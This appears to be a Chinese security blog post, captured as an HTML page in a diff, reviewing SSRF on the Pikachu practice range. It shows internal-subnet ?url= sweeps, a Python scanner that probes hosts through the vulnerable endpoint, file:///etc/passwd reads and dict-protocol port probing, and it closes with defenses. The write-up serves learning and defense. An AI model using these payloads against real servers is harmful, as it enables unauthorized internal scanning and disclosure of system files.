@@ -1,0 +1,228 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>OWASP Top10 | SSRF 漏洞复盘 | yokineaのblog</title><meta name="author" content="yokinea"><meta name="copyright" content="yokinea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="OWASP Top10 ｜SSRF 漏洞深度复盘一、漏洞概述SSRF 即服务器端请求伪造 攻击者利用服务器作为代理，发起任意网络请求，对内网资产、本地服务、外部接口进行探测与攻击。 主要危害： 内网端口扫描、读取本地文件、攻击内网应用、调用恶意接口、探测云服务器元数据信息。 二、漏洞核心原理 服务端代码主动请求外部可控 URL，未做地址与协议严格过滤 攻击者传入恶意地址，由服务器代为发起访问 服务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OWASP Top10 | SSRF 漏洞复盘">
+<meta property="og:url" content="http://example.com/2026/05/14/OWASP%20Top10%20%EF%BD%9CSSRF%20%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%20%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%20+%20%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="yokineaのblog">
+<meta property="og:description" content="OWASP Top10 ｜SSRF 漏洞深度复盘一、漏洞概述SSRF 即服务器端请求伪造 攻击者利用服务器作为代理，发起任意网络请求，对内网资产、本地服务、外部接口进行探测与攻击。 主要危害： 内网端口扫描、读取本地文件、攻击内网应用、调用恶意接口、探测云服务器元数据信息。 二、漏洞核心原理 服务端代码主动请求外部可控 URL，未做地址与协议严格过滤 攻击者传入恶意地址，由服务器代为发起访问 服务">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-05-14T12:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-23T07:57:03.741Z">
+<meta property="article:author" content="yokinea">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="OWASP Top10">
+<meta property="article:tag" content="Pikachu靶场">
+<meta property="article:tag" content="SSRF漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "OWASP Top10 | SSRF 漏洞复盘",
+  "url": "http://example.com/2026/05/14/OWASP%20Top10%20%EF%BD%9CSSRF%20%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%20%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%20+%20%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2026-05-14T12:00:00.000Z",
+  "dateModified": "2026-05-23T07:57:03.741Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "yokinea",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/05/14/OWASP%20Top10%20%EF%BD%9CSSRF%20%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%20%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%20+%20%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'OWASP Top10 | SSRF 漏洞复盘',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">yokineaのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">OWASP Top10 | SSRF 漏洞复盘</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">OWASP Top10 | SSRF 漏洞复盘</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-14T12:00:00.000Z" title="发表于 2026-05-14 20:00:00">2026-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-23T07:57:03.741Z" title="更新于 2026-05-23 15:57:03">2026-05-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/OWASP-Top10/">OWASP Top10</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="OWASP-Top10-｜SSRF-漏洞深度复盘"><a href="#OWASP-Top10-｜SSRF-漏洞深度复盘" class="headerlink" title="OWASP Top10 ｜SSRF 漏洞深度复盘"></a>OWASP Top10 ｜SSRF 漏洞深度复盘</h1><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p>SSRF 即<strong>服务器端请求伪造</strong></p>
+<p>攻击者利用服务器作为代理，发起任意网络请求，对内网资产、本地服务、外部接口进行探测与攻击。</p>
+<p>主要危害：</p>
+<p>内网端口扫描、读取本地文件、攻击内网应用、调用恶意接口、探测云服务器元数据信息。</p>
+<h2 id="二、漏洞核心原理"><a href="#二、漏洞核心原理" class="headerlink" title="二、漏洞核心原理"></a>二、漏洞核心原理</h2><ol>
+<li>服务端代码主动请求外部可控 URL，未做地址与协议严格过滤</li>
+<li>攻击者传入恶意地址，由服务器代为发起访问</li>
+<li>服务器权限远大于客户端，可访问内网隔离资源</li>
+</ol>
+<h3 id="常见支持危险协议"><a href="#常见支持危险协议" class="headerlink" title="常见支持危险协议"></a>常见支持危险协议</h3><ul>
+<li>http&#x2F;https：探测内外网站点、端口</li>
+<li>file：读取服务器本地任意文件</li>
+<li>dict：探测内网端口服务</li>
+<li>gopher：发送自定义数据包，配合漏洞组合利用</li>
+</ul>
+<h2 id="三、本地环境搭建"><a href="#三、本地环境搭建" class="headerlink" title="三、本地环境搭建"></a>三、本地环境搭建</h2><ol>
+<li>启动 Pikachu 漏洞靶场，保证网络环境正常</li>
+<li>进入功能模块：<strong>SSRF</strong></li>
+<li>确认页面存在远程图片加载、网址预览类可控请求点</li>
+<li>关闭本地简易防火墙，保证内网互通测试正常</li>
+</ol>
+<h2 id="四、Pikachu-靶场完整复现"><a href="#四、Pikachu-靶场完整复现" class="headerlink" title="四、Pikachu 靶场完整复现"></a>四、Pikachu 靶场完整复现</h2><h3 id="1-基础-SSRF-内网探测"><a href="#1-基础-SSRF-内网探测" class="headerlink" title="1. 基础 SSRF 内网探测"></a>1. 基础 SSRF 内网探测</h3><ol>
+<li><p>进入 Pikachu SSRF 关卡</p>
+<p><img src="/.com//../../img/1779520470685.png" alt="1779520470685"></p>
+<p><img src="/.com//../../img/1779521170169.png" alt="1779521170169"></p>
+</li>
+<li><p>输入内网存活主机地址，由服务器代为访问</p>
+<p><img src="/.com//../../img/1779521873802.png" alt="1779521873802"></p>
+</li>
+<li><p>批量遍历网段，实现内网存活主机扫描，依次输入对网站进行遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=http://192.168.239.1:80</span><br><span class="line">?url=http://192.168.239.2:80</span><br><span class="line">...</span><br><span class="line">?url=http://192.168.239.254:80</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>也可使用脚本遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># SSRF 内网存活主机探测</span><br><span class="line"># 利用curl发起内网请求，通过时间差判断主机存活</span><br><span class="line"></span><br><span class="line">net = &quot;192.168.239&quot;</span><br><span class="line">ssrf_url = &quot;http://localhost/pikachu/vul/ssrf/ssrf_curl.php&quot;</span><br><span class="line">timeout = 3</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 启动SSRF内网扫描...&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(1,255):</span><br><span class="line">    ip = f&quot;&#123;net&#125;.&#123;i&#125;&quot;</span><br><span class="line">    url = f&quot;&#123;ssrf_url&#125;?url=http://&#123;ip&#125;:80&quot;</span><br><span class="line">    </span><br><span class="line">    t1 = time.time()</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url,timeout=timeout)</span><br><span class="line">        use = time.time()-t1</span><br><span class="line">        </span><br><span class="line">        if use &lt; 2.5 and r.status_code != 500:</span><br><span class="line">            print(f&quot;[+] Live: &#123;ip&#125; | &#123;use:.2f&#125;s&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 扫描结束&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-File-协议读取本地文件"><a href="#2-File-协议读取本地文件" class="headerlink" title="2. File 协议读取本地文件"></a>2. File 协议读取本地文件</h3><p>传入协议地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>Windows 环境读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://C:/windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>成功读取服务器本地敏感配置文件。</p>
+<p><img src="/.com//../../img/1779522403740.png" alt="1779522403740"></p>
+<h3 id="3-Dict-协议端口探测"><a href="#3-Dict-协议端口探测" class="headerlink" title="3. Dict 协议端口探测"></a>3. Dict 协议端口探测</h3><p>使用 dict 协议对内网主机进行端口扫描，快速判断端口开放状态。</p>
+<p><img src="/.com//../../img/1779522198662.png"></p>
+<h2 id="五、实战踩坑点"><a href="#五、实战踩坑点" class="headerlink" title="五、实战踩坑点"></a>五、实战踩坑点</h2><ol>
+<li>部分环境禁用非 http 协议，file、dict 无法使用</li>
+<li>云服务器严格限制内网访问，探测范围受限</li>
+<li>请求超时时间过短，端口扫描准确率低</li>
+<li>存在 DNS 重绑定防护，域名绕过容易失效</li>
+<li>服务端开启代理，无法精准探测真实内网</li>
+</ol>
+<h2 id="六、防御方案"><a href="#六、防御方案" class="headerlink" title="六、防御方案"></a>六、防御方案</h2><ol>
+<li>禁用所有非 HTTP&#x2F;HTTPS 危险协议</li>
+<li>拦截内网 IP、本地回环地址、网段地址</li>
+<li>设置 URL 访问白名单，仅允许可信外部域名</li>
+<li>限制请求端口，仅开放 80、443 常用端口</li>
+<li>关闭服务器 DNS 重绑定解析</li>
+<li>统一请求超时时间，防止长时间扫描探测</li>
+<li>部署 WAF 拦截 SSRF 特征请求</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">yokinea</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/05/14/OWASP%20Top10%20%EF%BD%9CSSRF%20%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%20%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%20+%20%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">http://example.com/2026/05/14/OWASP%20Top10%20%EF%BD%9CSSRF%20%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%20%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%20+%20%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">yokineaのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/OWASP-Top10/">OWASP Top10</a><a class="post-meta__tags" href="/tags/Pikachu%E9%9D%B6%E5%9C%BA/">Pikachu靶场</a><a class="post-meta__tags" href="/tags/SSRF%E6%BC%8F%E6%B4%9E/">SSRF漏洞</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/05/23/DC1/" title="DC-1 靶场完整渗透实战 | 从信息收集到提权"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">DC-1 靶场完整渗透实战 | 从信息收集到提权</div></div><div class="info-2"><div class="info-item-1">环境配置dc1靶场地址 1https://www.vulnhub.com/entry/dc-1,292/    更新工具 信息收集查询网段  主机发现nmap -sn 192.168.239.0/24 这里写网段   端口扫描 nmap -A -p- 192.168.239.146     端口号 协议 服务名称 服务用途 常见漏洞 &#x2F; 利用点    21 TCP FTP 文件传输 弱口令、匿名登录、爆破、文件上传   22 TCP SSH 远程登录管理 密码爆破、密钥泄露、弱口令   23 TCP Telnet 明文远程登录 明文抓包、弱口令，安全性极低   25 TCP SMTP 邮件发送 邮件伪造、用户枚举、中继攻击   53 TCP&#x2F;UDP DNS 域名解析 DNS 域传送、缓存投毒、漏洞溢出   80 TCP HTTP 网页服务 SQL 注入、XSS、文件上传、RCE、目录遍历   110 TCP POP3 邮件接收 账号密码爆破、明文传输   135 TCP RPC 远程过程调用 MS17-010 永恒之蓝、RPC 漏洞溢出   139&#x2F;...</div></div></div></a><a class="pagination-related" href="/2026/05/13/upload/" title="OWASP Top10  | 文件上传漏洞进阶复盘"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">OWASP Top10  | 文件上传漏洞进阶复盘</div></div><div class="info-2"><div class="info-item-1">OWASP Top10 ｜文件上传漏洞进阶复盘—— 黑名单绕过、解析漏洞、Pikachu 靶场复现与防御全拆解 一、漏洞概述文件上传漏洞是 OWASP Top10 中危害极高的漏洞类型，成因是后端未对上传文件做严格校验，导致恶意脚本文件被上传至服务器并执行。 核心风险：上传 WebShell、远程代码执行、服务器被接管。 常见校验方式与绕过场景：  前端 JS 校验绕过 黑名单后缀过滤绕过 白名单 MIME 类型绕过 服务器解析漏洞利用 图片马 + 文件包含组合利用   二、深层漏洞原理1. 校验逻辑漏洞 仅在前端用 JS 限制文件类型，后端无校验 后端仅拦截.php等危险后缀，未过滤.php3/.phtml/.phar等变种 仅校验文件头（MIME 类型），未校验文件内容与后缀  2. 服务器解析漏洞 Apache 解析漏洞：文件名含.php，如xxx.php.xxx，会按 PHP 解析 Nginx 解析漏洞：文件名形如xxx.jpg/xxx.php，会按 PHP 解析 IIS 解析漏洞：xxx.asp;.txt 会被当作 ASP 文件解析  3. 组合利用：图片马 + 文件包...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/05/13/upload/" title="OWASP Top10  | 文件上传漏洞进阶复盘"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-13</div><div class="info-item-2">OWASP Top10  | 文件上传漏洞进阶复盘</div></div><div class="info-2"><div class="info-item-1">OWASP Top10 ｜文件上传漏洞进阶复盘—— 黑名单绕过、解析漏洞、Pikachu 靶场复现与防御全拆解 一、漏洞概述文件上传漏洞是 OWASP Top10 中危害极高的漏洞类型，成因是后端未对上传文件做严格校验，导致恶意脚本文件被上传至服务器并执行。 核心风险：上传 WebShell、远程代码执行、服务器被接管。 常见校验方式与绕过场景：  前端 JS 校验绕过 黑名单后缀过滤绕过 白名单 MIME 类型绕过 服务器解析漏洞利用 图片马 + 文件包含组合利用   二、深层漏洞原理1. 校验逻辑漏洞 仅在前端用 JS 限制文件类型，后端无校验 后端仅拦截.php等危险后缀，未过滤.php3/.phtml/.phar等变种 仅校验文件头（MIME 类型），未校验文件内容与后缀  2. 服务器解析漏洞 Apache 解析漏洞：文件名含.php，如xxx.php.xxx，会按 PHP 解析 Nginx 解析漏洞：文件名形如xxx.jpg/xxx.php，会按 PHP 解析 IIS 解析漏洞：xxx.asp;.txt 会被当作 ASP 文件解析  3. 组合利用：图片马 + 文件包...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">yokinea</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OWASP-Top10-%EF%BD%9CSSRF-%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98"><span class="toc-number">1.</span> <span class="toc-text">OWASP Top10 ｜SSRF 漏洞深度复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">一、漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">二、漏洞核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%94%AF%E6%8C%81%E5%8D%B1%E9%99%A9%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text">常见支持危险协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">三、本地环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Pikachu-%E9%9D%B6%E5%9C%BA%E5%AE%8C%E6%95%B4%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">四、Pikachu 靶场完整复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80-SSRF-%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. 基础 SSRF 内网探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-File-%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. File 协议读取本地文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Dict-%E5%8D%8F%E8%AE%AE%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.3.</span> <span class="toc-text">3. Dict 协议端口探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E6%88%98%E8%B8%A9%E5%9D%91%E7%82%B9"><span class="toc-number">1.5.</span> <span class="toc-text">五、实战踩坑点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.6.</span> <span class="toc-text">六、防御方案</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/23/linux%E6%8F%90%E6%9D%83/" title="Linux系统常见提权方式总结">Linux系统常见提权方式总结</a><time datetime="2026-05-23T12:10:00.000Z" title="发表于 2026-05-23 20:10:00">2026-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/23/DC1/" title="DC-1 靶场完整渗透实战 | 从信息收集到提权">DC-1 靶场完整渗透实战 | 从信息收集到提权</a><time datetime="2026-05-23T10:00:00.000Z" title="发表于 2026-05-23 18:00:00">2026-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/14/OWASP%20Top10%20%EF%BD%9CSSRF%20%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%20%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%20+%20%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/" title="OWASP Top10 | SSRF 漏洞复盘">OWASP Top10 | SSRF 漏洞复盘</a><time datetime="2026-05-14T12:00:00.000Z" title="发表于 2026-05-14 20:00:00">2026-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/13/upload/" title="OWASP Top10  | 文件上传漏洞进阶复盘">OWASP Top10  | 文件上传漏洞进阶复盘</a><time datetime="2026-05-13T10:00:00.000Z" title="发表于 2026-05-13 18:00:00">2026-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/11/xss/" title="OWASP Top10 ｜XSS 进阶复盘">OWASP Top10 ｜XSS 进阶复盘</a><time datetime="2026-05-11T10:00:00.000Z" title="发表于 2026-05-11 18:00:00">2026-05-11</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By yokinea</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script 